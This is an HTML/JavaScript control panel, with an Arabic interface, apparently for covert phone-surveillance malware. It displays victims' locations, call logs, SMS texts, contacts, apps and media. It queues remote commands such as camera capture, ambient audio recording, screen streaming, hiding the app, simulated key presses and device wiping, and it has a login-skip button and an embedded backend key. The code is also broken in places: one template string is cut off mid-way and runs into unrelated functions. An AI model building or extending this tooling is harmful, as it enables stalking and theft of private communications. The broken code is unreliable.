<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Admin - Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;scrollbar-width:thin;scrollbar-color:#1e293b transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:#080b16;color:#e2e8f0;min-height:100vh}
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#1e293b;border-radius:4px}
/* LOGIN */
#loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;background:radial-gradient(ellipse at 50% 0%,#0f1a3a 0%,#080b16 70%)}
.login-box{background:linear-gradient(135deg,#111827,#0f1525);padding:40px;border-radius:24px;width:100%;max-width:400px;border:1px solid rgba(59,130,246,.15);box-shadow:0 25px 60px rgba(0,0,0,.6)}.login-box h1{text-align:center;margin-bottom:4px;font-size:22px;color:#f1f5f9}
.login-box .sub{text-align:center;color:#64748b;margin-bottom:28px;font-size:13px}.input-group{margin-bottom:16px}
.input-group label{display:block;font-size:12px;color:#94a3b8;margin-bottom:6px;font-weight:500}
.input-group input{width:100%;padding:12px 16px;background:#080b16;border:1px solid #1e293b;border-radius:12px;color:#e2e8f0;font-size:14px;outline:none;transition:border .2s,box-shadow .2s}
.input-group input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.15)}
/* BUTTONS */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:10px 20px;border:none;border-radius:10px;font-size:13px;cursor:pointer;font-weight:600;transition:all .2s}
.btn-primary{background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;width:100%}.btn-primary:hover{transform:translateY(-1px);box-shadow:0 4px 15px rgba(59,130,246,.3)}
.btn-danger{background:#ef4444;color:#fff}.btn-danger:hover{transform:translateY(-1px)}
.btn-success{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff}
.btn-ghost{background:transparent;border:1px solid #1e293b;color:#94a3b8}.btn-ghost:hover{background:#1e293b;color:#e2e8f0}
.btn-sm{padding:6px 12px;font-size:11px}
.btn-outline{background:transparent;border:1px solid #3b82f6;color:#3b82f6;padding:6px 14px;border-radius:8px;font-size:12px;cursor:pointer;transition:all .2s}
.btn-outline:hover{background:#3b82f6;color:#fff}
.error-msg{color:#ef4444;font-size:13px;text-align:center;margin-top:12px}
.hidden{display:none!important}
/* LAYOUT */
#app{display:flex;height:100vh}
/* Sidebar */
.sidebar{width:280px;min-width:280px;background:linear-gradient(180deg,#111827,#0c1220);border-left:1px solid #1e293b;display:flex;flex-direction:column}
.sidebar-header{padding:18px 20px;border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between}
.sidebar-header h2{font-size:14px;display:flex;align-items:center;gap:8px;color:#f1f5f9}
.sidebar-header .badge{background:linear-gradient(135deg,#3b82f6,#2563eb);color:#fff;font-size:10px;padding:2px 10px;border-radius:20px;font-weight:600}
.device-list{flex:1;overflow-y:auto;padding:8px}
.device-item{padding:12px 14px;border-radius:12px;cursor:pointer;transition:all .15s;border:1px solid transparent;margin-bottom:4px}
.device-item:hover{background:rgba(59,130,246,.05)}
.device-item.active{background:rgba(59,130,246,.08);border-color:rgba(59,130,246,.2)}
.device-item .d-top{display:flex;align-items:center;justify-content:space-between}
.device-item .d-name{font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
.device-item .d-meta{font-size:11px;color:#64748b;margin-top:4px}
.device-item .status-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
.s-online{background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,.4)}.s-offline{background:#64748b}.s-stealth{background:#f59e0b}
/* MAIN */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
.main-header{padding:14px 24px;border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between;background:rgba(17,24,39,.8);backdrop-filter:blur(12px)}
.main-header h1{font-size:16px;display:flex;align-items:center;gap:8px}
.main-header .device-info{font-size:12px;color:#64748b}
/* Tabs */
.tabs{display:flex;gap:0;border-bottom:1px solid #1e293b;padding:0 16px;background:#0c1220;overflow-x:auto}
.tab{padding:12px 18px;font-size:12px;cursor:pointer;border-bottom:2px solid transparent;color:#64748b;font-weight:500;transition:all .2s;white-space:nowrap}
.tab:hover{color:#e2e8f0}.tab.active{color:#3b82f6;border-bottom-color:#3b82f6}
/* Tab Content */
.tab-content{flex:1;overflow-y:auto;padding:20px;background:#080b16}
/* Cards */
.card{background:linear-gradient(135deg,#111827,#0f1525);border-radius:16px;border:1px solid #1e293b;padding:20px;margin-bottom:16px}
.card-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
.card-header h3{font-size:14px;font-weight:600;display:flex;align-items:center;gap:6px;color:#f1f5f9}
.card-header .count{font-size:11px;color:#64748b;background:#080b16;padding:2px 10px;border-radius:20px;border:1px solid #1e293b}
/* Grids */
.grid-4{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-bottom:16px}
.grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:16px}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:16px}
@media(max-width:768px){.grid-2,.grid-3,.grid-4{grid-template-columns:1fr}}
/* Stat Cards */
.stat-card{background:linear-gradient(135deg,#0c1220,#080b16);border-radius:14px;padding:18px;border:1px solid #1e293b;position:relative;overflow:hidden}
.stat-card::before{content:'';position:absolute;top:0;right:0;width:80px;height:80px;border-radius:50%;background:rgba(59,130,246,.05);transform:translate(30%,-30%)}
.stat-card .s-icon{font-size:22px;margin-bottom:8px}
.stat-card .s-label{font-size:11px;color:#64748b;font-weight:500;text-transform:uppercase;letter-spacing:.5px}
.stat-card .s-value{font-size:20px;font-weight:700;margin-top:6px;color:#f1f5f9}
.stat-card .s-sub{font-size:12px;color:#64748b;margin-top:2px}
/* Map */
#overviewMap,#allLocationsMap{height:320px;border-radius:12px;overflow:hidden}
/* Table */
.data-table{width:100%;border-collapse:collapse;font-size:12px}
.data-table th{text-align:right;padding:10px 12px;color:#64748b;font-weight:500;font-size:11px;border-bottom:1px solid #1e293b;text-transform:uppercase;letter-spacing:.3px}
.data-table td{padding:10px 12px;border-bottom:1px solid rgba(30,41,59,.5);color:#e2e8f0}
.data-table tr:hover td{background:rgba(59,130,246,.03)}
.data-table .timestamp{font-size:11px;color:#64748b;white-space:nowrap}
/* Commands */
.cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
.cmd-btn{padding:8px 14px;border:1px solid #1e293b;border-radius:10px;background:linear-gradient(135deg,#0c1220,#080b16);color:#e2e8f0;cursor:pointer;font-size:12px;transition:all .2s;white-space:nowrap}
.cmd-btn:hover{background:#1e293b;border-color:#3b82f6;transform:translateY(-1px)}
.cmd-btn:active{transform:scale(.96)}
.cmd-btn.danger{border-color:#ef4444;color:#ef4444}.cmd-btn.danger:hover{background:#ef4444;color:#fff}
/* Toast */
.toast{position:fixed;bottom:24px;left:24px;background:#111827;border:1px solid #1e293b;color:#e2e8f0;padding:12px 20px;border-radius:12px;font-size:13px;z-index:9999;animation:slideUp .3s ease;box-shadow:0 10px 30px rgba(0,0,0,.5)}
@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.cmd-result{padding:12px 16px;border-radius:10px;font-size:13px;margin-bottom:12px}
/* Media grid */
.media-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
.media-item{background:#0c1220;border-radius:12px;overflow:hidden;border:1px solid #1e293b;transition:transform .2s}
.media-item:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(0,0,0,.3)}
.media-item img,.media-item video{width:100%;height:140px;object-fit:cover}
.media-item .m-info{padding:10px}.media-item .m-info div{font-size:11px;color:#64748b}
/* Location link */
.loc-link{color:#60a5fa;text-decoration:none;font-size:12px;transition:color .2s}
.loc-link:hover{color:#93c5fd;text-decoration:underline}
/* SMS full text */
.sms-body{font-size:12px;word-break:break-word;white-space:pre-wrap;max-width:350px;color:#cbd5e1;line-height:1.5}
/* Filter input */
.filter-input{background:#080b16;border:1px solid #1e293b;border-radius:10px;padding:8px 14px;color:#e2e8f0;font-size:13px;width:220px;outline:none;transition:border .2s}
.filter-input:focus{border-color:#3b82f6}
/* Responsive */
@media(max-width:768px){.sidebar{width:64px;min-width:64px}.sidebar .d-meta,.sidebar .d-name span:not(.status-dot){display:none}.sidebar-header h2 span{display:none}.sidebar-header{padding:12px}.sidebar .badge{display:none}.device-item{padding:10px}}
/* Extra */
.battery-bar{height:4px;border-radius:4px;background:#1e293b;margin-top:6px;overflow:hidden}
.battery-fill{height:100%;border-radius:4px;transition:width .5s ease}
.section-title{font-size:13px;color:#94a3b8;margin-bottom:12px;font-weight:500;display:flex;align-items:center;gap:8px}
</style>
</head>
<body>

<div id="loginScreen">
  <div class="login-box">
    <h1>System Admin</h1>
    <div class="sub">يرجى تسجيل الدخول للوحة التحكم</div>
    <div id="loginError" class="error-msg hidden"></div>
    <div class="input-group">
      <label>البريد الإلكتروني</label>
      <input type="email" id="emailInput" placeholder="admin@example.com" dir="ltr">
    </div>
    <div class="input-group">
      <label>كلمة المرور</label>
      <input type="password" id="passInput" placeholder="password" dir="ltr">
    </div>
    <button class="btn btn-primary" onclick="doLogin()">تسجيل الدخول</button>
    <button class="btn btn-ghost" style="margin-top:10px" onclick="skipLogin()">دخول سريع</button>
  </div>
</div>

<div id="app" class="hidden">
  <div class="sidebar">
    <div class="sidebar-header">
      <h2><span>📡</span> <span>الأجهزة</span></h2>
      <span class="badge" id="deviceCount">0</span>
    </div>
    <div class="device-list" id="deviceList">
      <div style="text-align:center;padding:30px;color:#64748b;font-size:13px">جاري تحميل الأجهزة...</div>
    </div>
  </div>
  <div class="main">
    <div class="main-header">
      <div>
        <h1 id="mainTitle">لوحة التحكم</h1>
        <div class="device-info" id="deviceInfo"></div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="btn btn-ghost btn-sm" onclick="refreshDevices()">تحديث</button>
        <button class="btn btn-ghost btn-sm" onclick="doLogout()">خروج</button>
      </div>
    </div>
    <div class="tabs" id="tabs">
      <div class="tab active" data-tab="overview" onclick="switchTab('overview')">نظرة عامة</div>
      <div class="tab" data-tab="location" onclick="switchTab('location')">المواقع</div>
      <div class="tab" data-tab="calls" onclick="switchTab('calls')">المكالمات</div>
      <div class="tab" data-tab="sms" onclick="switchTab('sms')">الرسائل</div>
      <div class="tab" data-tab="contacts" onclick="switchTab('contacts')">جهات الاتصال</div>
      <div class="tab" data-tab="apps" onclick="switchTab('apps')">التطبيقات</div>
      <div class="tab" data-tab="media" onclick="switchTab('media')">الوسائط</div>
      <div class="tab" data-tab="state" onclick="switchTab('state')">الحالة</div>
      <div class="tab" data-tab="commands" onclick="switchTab('commands')">التحكم</div>
    </div>
    <div class="tab-content" id="tabContent">
      <div style="text-align:center;padding:40px;color:#64748b">جاري تحميل البيانات...</div>
    </div>
  </div>
</div>

<script>
const supabaseUrl = 'https://zlhcseovfjilzgxdkskw.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpsaGNzZW92ZmppbHpneGRrc2t3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA2NTkxNjQsImV4cCI6MjA5NjIzNTE2NH0.eF4ZqQ1LbJYhCk8ZR8qFZ1n_7vEDMGCBw_bXhCZrE6s';
const sb = supabase.createClient(supabaseUrl, supabaseKey);
let currentUser = null, selectedDevice = null, currentTab = 'overview', mapInstance = null;
const CT = t => { const n = t?.charAt(0)?.toUpperCase() + t?.slice(1); return n || '' };
const DT = d => d ? new Date(d).toLocaleString('ar-SA') : '—';
const nt = v => typeof v === 'number' ? v : parseInt(v) || 0;

async function skipLogin() {
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('app').classList.remove('hidden');
  currentUser = { email: 'demo@admin.com' };
  init();
}

async function doLogin() {
  const email = document.getElementById('emailInput').value.trim();
  const pass = document.getElementById('passInput').value;
  const errEl = document.getElementById('loginError');
  errEl.classList.add('hidden');
  if (!email || !pass) { errEl.textContent = 'يرجى إدخال البريد وكلمة المرور'; errEl.classList.remove('hidden'); return; }
  const { data, error } = await sb.auth.signInWithPassword({ email, password: pass });
  if (error) { errEl.textContent = error.message; errEl.classList.remove('hidden'); return; }
  currentUser = data.user;
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('app').classList.remove('hidden');
  init();
}

function doLogout() { sb.auth.signOut(); currentUser = null; selectedDevice = null; document.getElementById('app').classList.add('hidden'); document.getElementById('loginScreen').classList.remove('hidden'); }

async function init() {
  await refreshDevices();
  setInterval(refreshDevices, 15000);
  setInterval(refreshCurrentTab, 15000);
}

async function refreshDevices() {
  const { data, error } = await sb.from('devices').select('*').order('last_seen_at', { ascending: false });
  if (error) return;
  const list = document.getElementById('deviceList'), count = document.getElementById('deviceCount');
  count.textContent = data.length;
  if (!data.length) {
    list.innerHTML = '<div style="text-align:center;padding:30px;color:#64748b;font-size:13px">لا توجد أجهزة مسجلة</div>';
    return;
  }
  list.innerHTML = data.map(d => {
    const online = d.last_seen_at && (Date.now() - new Date(d.last_seen_at).getTime()) < 300000;
    const active = selectedDevice?.device_serial === d.device_serial;
    return `<div class="device-item ${active ? 'active' : ''}" onclick="selectDevice('${d.device_serial}')">
      <div class="d-top"><div class="d-name"><span class="status-dot ${online ? 's-online' : 's-offline'}"></span><span>${d.name || d.device_serial?.slice(0,12)||'Unknown'}</span></div>
      <span style="font-size:11px;color:#64748b">${d.battery_level || 0}%</span></div>
      <div class="d-meta">${d.network_type || '—'} · ${d.last_seen_at ? DT(d.last_seen_at) : '—'}</div></div>`;
  }).join('');
  if (!selectedDevice && data.length > 0) selectDevice(data[0].device_serial);
}

function selectDevice(serial) {
  selectedDevice = { device_serial: serial };
  document.getElementById('mainTitle').innerHTML = serial.slice(0,16);
  document.getElementById('deviceInfo').textContent = serial;
  document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
  const idx = [...document.querySelectorAll('.device-item')].findIndex(el => el.textContent.includes(serial.slice(0,8)));
  if (idx >= 0) document.querySelectorAll('.device-item')[idx]?.classList.add('active');
  switchTab('overview');
}

function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
  renderTab(tab);
}

function refreshCurrentTab() { if (selectedDevice) renderTab(currentTab); }

async function renderTab(tab) {
  const el = document.getElementById('tabContent');
  if (!selectedDevice) { el.innerHTML = '<div style="text-align:center;padding:40px;color:#64748b">اختر جهازاً أولاً</div>'; return; }
  const map = { overview:renderOverview, location:renderLocations, calls:renderCallLogs, sms:renderSms, contacts:renderContacts, apps:renderApps, media:renderMedia, state:renderDeviceState, commands:renderCommands };
  await (map[tab] || (() => {}))(el);
}

// ================== OVERVIEW ==================
async function renderOverview(el) {
  const [locRes, stateRes, notifRes, callRes, smsRes] = await Promise.all([
    sb.from('location_history').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(100),
    sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(1),
    sb.from('notification_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(5),
    sb.from('call_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('call_date', { ascending: false }).limit(5),
    sb.from('sms_messages').select('*').eq('device_serial', selectedDevice.device_serial).order('sms_date', { ascending: false }).limit(5)
  ]);
  const locs = locRes.data || [], loc = locs[0], state = stateRes.data?.[0], notifs = notifRes.data || [], calls = callRes.data || [], smsList = smsRes.data || [];
  el.innerHTML = `<div class="grid-4">
    <div class="stat-card"><div class="s-icon">📍</div><div class="s-label">آخر موقع</div>
      <div class="s-value" style="font-size:16px">${loc ? `${loc.latitude?.toFixed(4)}, ${loc.longitude?.toFixed(4)}` : '—'}</div>
      <div class="s-sub">${loc?.captured_at ? DT(loc.captured_at) : ''}</div>
      ${loc ? `<a class="loc-link" href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="margin-top:6px;display:inline-block">فتح في Google Maps</a>` : ''}
      ${locs.length > 1 ? `<div style="margin-top:6px;font-size:11px;color:#64748b">آخر ${Math.min(locs.length,100)} موقع — <a href="#" onclick="switchTab('location');return false" style="color:#3b82f6">عرض الكل</a></div>` : ''}
    </div>
    <div class="stat-card"><div class="s-icon">🔋</div><div class="s-label">البطارية</div>
      <div class="s-value">${state?.battery_level || 0}%</div>
      <div class="s-sub">${state?.is_charging ? 'يشحن' : 'بطارية'} · ${state?.network_type || '—'}</div>
      <div class="battery-bar"><div class="battery-fill" style="width:${state?.battery_level || 0}%;background:${(state?.battery_level||0) > 20 ? (state?.is_charging ? '#22c55e' : '#3b82f6') : '#ef4444'}"></div></div>
    </div>
    <div class="stat-card"><div class="s-icon">💾</div><div class="s-label">التخزين</div>
      <div class="s-value" style="font-size:16px">${state?.storage_available ? fmt(state.storage_available) : '—'}</div>
      <div class="s-sub">من ${state?.storage_total ? fmt(state.storage_total) : '—'}</div>
    </div>
    <div class="stat-card"><div class="s-icon">📡</div><div class="s-label">الشبكة</div>
      <div class="s-value" style="font-size:16px">${state?.network_type || '—'}</div>
      <div class="s-sub">${state?.signal_strength ? `الإشارة: ${state.signal_strength}` : ''}</div>
    </div>
  </div>`;
  if (loc) el.innerHTML += `<div class="card"><div class="card-header"><h3>المواقع على الخريطة (${locs.length})</h3><a href="#" onclick="switchTab('location');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>
    <div id="overviewMap" style="height:280px;border-radius:12px"></div></div>`;
  if (notifs.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر الإشعارات</h3><span class="count">${notifs.length}</span></div>
    <table class="data-table">${notifs.map(n => `<tr><td style="font-size:12px">${n.app_name||'—'}</td><td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${n.title||'—'}</td><td class="timestamp">${n.captured_at ? DT(n.captured_at) : '—'}</td></tr>`).join('')}</table></div>`;
  if (calls.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر المكالمات</h3><a href="#" onclick="switchTab('calls');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>
    <table class="data-table">${calls.map(r => `<tr><td style="font-size:12px">${r.phone_number||'—'}</td><td>${r.contact_name||'—'}</td><td>${ctLabel(r.call_type)}</td><td class="timestamp">${r.call_date ? DT(r.call_date) : '—'}</td></tr>`).join('')}</table></div>`;
  if (smsList.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر الرسائل</h3><a href="#" onclick="switchTab('sms');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>

async function sendCommand(command, params = {}) {
  if (!selectedDevice) { toast('ما في جهاز محدد'); return; }
  const rEl = document.getElementById('cmdResult');
  rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">جاري إرسال "${cmdLabels[command] || command}"...</div>`;
  const { data, error } = await sb.from('remote_commands').insert({
    device_serial: selectedDevice.device_serial, command,
    parameters: JSON.stringify(params), status: 'pending', sent_at: new Date().toISOString()
  }).select();
  if (error) { rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#ef4444">خطأ: ${error.message}</div>`; return; }
  const cmdId = data?.[0]?.id;
  let attempts = 0, maxAttempts = 30;
  const check = setInterval(async () => {
    attempts++;
    const { data: cmd } = await sb.from('remote_commands').select('status,executed_at,result').eq('id', cmdId).single();
    if (cmd?.status === 'executed') {
      clearInterval(check);
      rEl.innerHTML = `<div class="cmd-result" style="background:#0a2e1a;color:#22c55e">تم تنفيذ "${cmdLabels[command] || command}" بنجاح</div>`;
      loadPrevCommands(); setTimeout(() => renderTab(currentTab), 2000);
    } else if (cmd?.status === 'failed') {
      clearInterval(check);
      rEl.innerHTML = `<div class="cmd-result" style="background:#2e0a0a;color:#ef4444">فشل: ${cmd.result || 'خطأ'}</div>`;
      loadPrevCommands();
    } else if (attempts >= maxAttempts) {
      clearInterval(check);
      rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">الجهاز قد لا يكون متصلاً</div>`;
    }
  }, 2000);
}

async function sendAllCaptureCommands() {
  const cmds = ['capture_location','capture_call_logs','capture_sms','capture_contacts','capture_apps'];
  const rEl = document.getElementById('cmdResult');
  rEl.innerHTML = `<div class="cmd-result" style="background:#1e293b;color:#f59e0b">جاري جمع ورفع جميع البيانات...</div>`;
  let sent = 0, failed = 0;
  for (const cmd of cmds) {
    const { error } = await sb.from('remote_commands').insert({
      device_serial: selectedDevice.device_serial, command,
      parameters: '{}', status: 'pending', sent_at: new Date().toISOString()
    });
    if (error) failed++; else sent++;
  }
  rEl.innerHTML = `<div class="cmd-result" style="background:#0a2e1a;color:${failed > 0 ? '#f59e0b' : '#22c55e'}">تم إرسال ${sent} أوامر${failed > 0 ? `, فشل ${failed}` : ''}</div>`;
  loadPrevCommands(); setTimeout(() => renderTab(currentTab), 3000);
}

const cmdLabels = { sync_now:'مزامنة', capture_location:'موقع', capture_call_logs:'المكالمات', capture_sms:'الرسائل', capture_contacts:'جهات الاتصال', capture_apps:'التطبيقات', capture_camera:'تصوير', record_ambient:'تسجيل', lock_device:'قفل', hide_app:'إخفاء', unhide_app:'إظهار', play_sound:'إنذار', send_alert:'تنبيه', update_interval:'تحديث', restart_service:'إعادة تشغيل', screen_capture:'لقطة شاشة', screen_stream_start:'بث مباشر', screen_stream_stop:'إيقاف بث', key_press:'ضغطة زر', open_app:'فتح تطبيق', start_accessibility:'تحكم باللمس' };

function confirmWipe() { if (confirm('تحذير: هذا الأمر سيمسح الجهاز بالكامل!')) { if (confirm('تأكيد نهائي: أنت متأكد؟')) sendCommand('wipe_device'); } }

async function loadPrevCommands() {
  if (!selectedDevice) return;
  const { data } = await sb.from('remote_commands').select('*').eq('device_serial', selectedDevice.device_serial).order('sent_at', { ascending: false }).limit(20);
  const el = document.getElementById('prevCommands');
  if (!el) return;
  if (!data || !data.length) { el.innerHTML = '<div style="color:#64748b;font-size:13px">ما في أوامر سابقة</div>'; return; }
  el.innerHTML = `<table class="data-table"><tr><th>التاريخ</th><th>الأمر</th><th>الحالة</th><th>النتيجة</th></tr>
    ${data.map(r => `<tr><td class="timestamp">${r.sent_at ? DT(r.sent_at) : '—'}</td>
      <td style="font-family:monospace;font-size:11px">${r.command}</td>
      <td><span style="color:${r.status === 'executed' ? '#22c55e' : r.status === 'failed' ? '#ef4444' : '#f59e0b'}">${r.status}</span></td>
      <td style="font-size:11px;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.result||'—'}</td></tr>`).join('')}
    </table>`;
}

function ctNum(v) { return typeof v === 'number' ? v : (v === 'incoming' ? 1 : v === 'outgoing' ? 2 : v === 'missed' ? 3 : v === 'voicemail' ? 4 : v === 'rejected' ? 5 : v === 'blocked' ? 6 : nt(v)); }
function ctLabel(v) { const n = ctNum(v); return ['','وارد','صادر','فائت','بريد صوتي','مرفوض','محظور'][n] || '—'; }
function mtNum(v) { return typeof v === 'number' ? v : (v === 'inbox' ? 1 : v === 'sent' ? 2 : v === 'draft' ? 3 : v === 'outbox' ? 4 : nt(v)); }
